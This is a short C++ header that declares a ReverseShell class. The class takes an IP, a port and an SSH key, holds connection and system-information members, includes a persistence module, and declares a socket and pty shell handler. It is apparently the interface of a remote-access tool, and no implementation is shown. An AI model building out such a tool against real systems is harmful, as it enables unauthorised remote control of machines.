#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include "Connection.h"
#include "SystemInfo.h"
#include "Persistence.h"
#include <string>

class ReverseShell {
public:
    ReverseShell(const std::string& ip, int port, const std::string& sshKey);
    void run();

private:
    Connection conn;
    SystemInfo sysInfo;
    std::string sshKey;
    void handleShell(int sockfd, int pty_fd);
};

#endif 
